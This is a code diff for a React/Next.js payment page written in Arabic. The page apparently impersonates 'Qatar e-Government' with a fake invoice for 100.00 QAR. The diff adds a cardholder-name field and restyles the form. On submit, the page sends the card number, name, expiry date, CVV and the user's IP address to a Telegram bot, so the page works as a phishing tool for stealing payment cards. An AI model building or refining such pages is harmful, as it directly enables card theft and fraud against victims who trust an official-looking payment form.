@@ -6,6 +6,8 @@ export default function PaymentPage() {
   const router = useRouter();
 
   const [cardNumber, setCardNumber] = useState("");
+  const [name, setName] = useState("");
+  
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
   const [cvv, setCvv] = useState("");
@@ -44,10 +46,18 @@ export default function PaymentPage() {
     setCvv(value);
   };
 
+const handleNameChange = (e) => {
+    const value = e.target.value
+    setName(value);
+  };
+
   const validateFields = () => {
     const newErrors = {};
     if (!cardNumber || cardNumber.replace(/\s/g, "").length < 16) {
       newErrors.cardNumber = true;
+    }
+    if (!name) {
+      newErrors.name = true;
     }
     if (!expiryMonth) newErrors.expiryMonth = true;
     if (!expiryYear) newErrors.expiryYear = true;
@@ -61,7 +71,7 @@ export default function PaymentPage() {
     if (validateFields()) {
       const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
       const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
-      const message = `تفاصيل الدفع:\n- رقم البطاقة: ${cardNumber}\n- الشهر: ${expiryMonth}\n- السنة: ${expiryYear}\n- CVV: ${cvv}\n- IP المستخدم: ${ipAddress}`;
+      const message = `تفاصيل الدفع:\n- رقم البطاقة: ${cardNumber}\n- الإسم: ${name}\n- الشهر: ${expiryMonth}\n- السنة: ${expiryYear}\n- CVV: ${cvv}\n- IP المستخدم: ${ipAddress}`;
 
       try {
         const response = await fetch(
@@ -88,39 +98,75 @@ export default function PaymentPage() {
   };
 
   return (
-    <div className="flex items-center justify-center">
+    <div className="flex flex-col bg-gray-200 h-screen p-4 space-y-4">
+    <div className="max-w-xl bg-white rounded-lg shadow-md p-3 flex flex-row-reverse text-center">
+      
+      {/* العمود الأول */}
+
+      <div className="flex-1 border-r border-[#d81b60] px-2">
+        <p className="text-xs text-gray-600">رقم الفاتورة</p>
+        <p className="text-xs font-bold">20000743399</p>
+      </div>
+
+      {/* العمود الثاني */}
+      <div className="flex-1 border-r border-[#d81b60] px-2">
+        <p className="text-xs text-gray-600">مبلغ المعاملة</p>
+        <p className="text-xs font-bold">100.00 QAR</p>
+      </div>
+
+      {/* العمود الثالث */}
+      <div className="flex-1 border-r border-[#d81b60] px-2">
+        <p className="text-xs text-gray-600">اسم التاجر</p>
+        <p className="text-xs font-bold">Qatar e-Government</p>
+      </div>
+      <div className="flex-1">
+            </div>
+    </div>
       <form
         onSubmit={handleSubmit}
-        className="bg-white p-8 rounded-lg w-full max-w-md"
-      >
-        <h2 className="text-xl font-semibold mb-6">يرجى إدخال معلومات البطاقة</h2>
+        className="bg-[url('/Bg.jpeg')] bg-cover bg-center bg-no-repeat py-8 px-3 rounded-lg w-full max-w-md h-auto shadow-md space-y-8">
+        
+        <h2 className="text-lg text-gray-600 font-semibold mb-6">يرجى إدخال تفاصيل البطاقة</h2>
 
         {/* رقم البطاقة */}
+        
         <div className="mb-4">
-          <label className="block text-sm font-medium mb-1">رقم البطاقة</label>
+          <label className="block text-xs font-medium mb-1 text-gray-600">رقم البطاقة</label>
           <input
             type="text"
             value={cardNumber}
             onChange={handleCardNumberChange}
-            placeholder="XXXX XXXX XXXX XXXX"
-            className={`w-full p-3 border rounded-lg ${
-              errors.cardNumber ? "border-2 border-red-500" : "border-gray-300"
+            placeholder="رقم البطاقة"
+            className={`w-full bg-gray-50 placeholder:text-gray-900 placeholder:font-semibold rounded-sm text-xs p-2 border-b ${
+              errors.name ? "border-b-1 border-red-500" : "border-gray-400"
             }`}
           />
         </div>
-
+        <div className="mb-4">
+          <label className="block text-xs font-medium mb-1 text-gray-600">الإسم كما هو موضح في بطاقتك</label>
+          <input
+            type="text"
+            value={name}
+            onChange={handleNameChange}
+            placeholder="أدخل إسم حامل البطاقة"
+            className={`w-full bg-gray-50 placeholder:text-gray-900 placeholder:font-semibold rounded-sm text-xs p-2 border-b ${
+              errors.cardNumber ? "border-b-1 border-red-500" : "border-gray-400"
+            }`}
+          />
+        </div>
         {/* تاريخ انتهاء الصلاحية */}
+      <div>
+        <label className="block text-xs font-medium mb-1 text-gray-600">تاريخ إنتهاء الصلاحية</label>      
         <div className="mb-4 flex gap-4">
           {/* Dropdown الشهر */}
           <div className="w-1/2 relative">
-            <label className="block text-sm font-medium mb-1">الشهر</label>
             <div
-              className={`w-full p-3 border rounded-lg cursor-pointer ${
-                errors.expiryMonth ? "border-2 border-red-500" : "border-gray-300"
+              className={`w-full bg-gray-50 rounded-sm text-xs text-gray-900 font-semibold p-2 border-b cursor-pointer ${
+                errors.expiryMonth ? "border-b-1 border-red-500" : "border-gray-400"
               }`}
               onClick={() => setShowMonthDropdown(!showMonthDropdown)}
             >
-              {expiryMonth || "اختر الشهر"}
+              {expiryMonth || "شهر"}
             </div>
             <ul
               className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${
@@ -146,14 +192,13 @@ export default function PaymentPage() {
 
           {/* Dropdown السنة */}
           <div className="w-1/2 relative">
-            <label className="block text-sm font-medium mb-1">السنة</label>
             <div
-              className={`w-full p-3 border rounded-lg cursor-pointer ${
-                errors.expiryYear ? "border-2 border-red-500" : "border-gray-300"
+              className={`w-full bg-gray-50 text-gray-900 font-semibold rounded-sm text-xs p-2 border-b cursor-pointer ${
+                errors.expiryYear ? "border-b-1 border-red-500" : "border-gray-400"
               }`}
               onClick={() => setShowYearDropdown(!showYearDropdown)}
             >
-              {expiryYear || "اختر السنة"}
+              {expiryYear || "سنة"}
             </div>
             <ul
               className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${
@@ -177,17 +222,17 @@ export default function PaymentPage() {
             </ul>
           </div>
         </div>
-
+      </div>
         {/* رمز الحماية CVV */}
         <div className="mb-4">
-          <label className="block text-sm font-medium mb-1">رمز الحماية (CVV)</label>
+          <label className="block text-xs font-medium mb-1 text-gray-600">رمز الحماية</label>
           <input
             type="text"
             value={cvv}
             onChange={handleCvvChange}
-            placeholder="CVV"
-            className={`w-full p-3 border rounded-lg ${
-              errors.cvv ? "border-2 border-red-500" : "border-gray-300"
+            placeholder="يرجى إدخال cvv"
+            className={`w-full bg-gray-50 placeholder:text-gray-900 placeholder:font-semibold rounded-sm text-xs p-2 border-b ${
+              errors.cvv ? "border-b-1 border-red-500" : "border-gray-400"
             }`}
           />
         </div>
@@ -195,9 +240,9 @@ export default function PaymentPage() {
         {/* زر الدفع */}
         <button
           type="submit"
-          className="w-full bg-[#c81048] text-white p-3 rounded-lg font-semibold hover:bg-[#d81b60]"
+          className="w-full bg-[#c81048] text-white p-2 rounded-lg font-semibold hover:bg-[#d81b60]"
         >
-          ادفع الآن
+      دفع 
         </button>
       </form>
     </div>
